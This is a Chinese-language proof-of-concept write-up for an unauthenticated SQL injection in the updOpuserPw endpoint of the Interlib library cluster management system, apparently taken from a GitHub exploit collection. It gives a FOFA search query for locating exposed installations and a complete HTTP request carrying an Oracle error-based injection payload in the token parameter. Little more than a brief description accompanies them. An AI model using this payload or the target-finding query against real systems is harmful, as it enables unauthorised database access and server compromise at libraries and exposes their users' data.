# 图书馆集群管理系统interlib updOpuserPw SQL注入漏洞

## 1.漏洞描述

Interlib图书馆集群管理系统是全新的第三代图书馆系统，它作为资源共建共享的新的实现形式，打破了各图书馆单位所有，条块分割的局面，将城市图书馆群或高校多个校区的图书馆作为一个整体进行管理，从而能达到资源共建共享、合理配置和图书馆之间互相合作的目的。其updOpuserPw接口存在SQl注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息，例如添加、删除或修改记录，进而控制服务器系统。

## 2.搜索语法

```plain
fofa：body="interlib"
```

## 3.漏洞复现

```plain
GET /interlib3/service/sysop/updOpuserPw?loginid=test&newpassword=12356&token=1%27and+ctxsys.drithsx.sn(1,(select%20MOD(9,9)%20from%20dual))=%272 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

SQL报错成功执行取模运算函数

![image](https://github.com/hardog123/poc-exp/assets/170905460/b745d643-9437-42d3-9963-953b5e0561f4)
